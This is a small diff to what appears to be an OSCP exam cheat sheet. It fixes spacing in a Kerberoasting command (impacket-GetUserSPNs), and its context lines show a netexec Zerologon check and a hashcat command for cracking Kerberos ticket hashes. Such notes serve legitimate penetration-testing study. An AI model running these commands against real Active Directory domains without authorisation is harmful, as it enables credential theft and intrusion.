@@ -45,7 +45,7 @@ netexec smb <IP> -u '' -p '' -M zerologon
 ```
 
 ```bash
-impacket-GetUserSPNs  oscp.exam/user:pass -dc-ip 192.168.1.129 -request
+impacket-GetUserSPNs oscp.exam/user:pass -dc-ip 192.168.1.129 -request
 
 hashcat -m 13100 crackme.txt ~/rockyou.txt -O -r ~/opt/wordlists/best64.rule -O
 ```
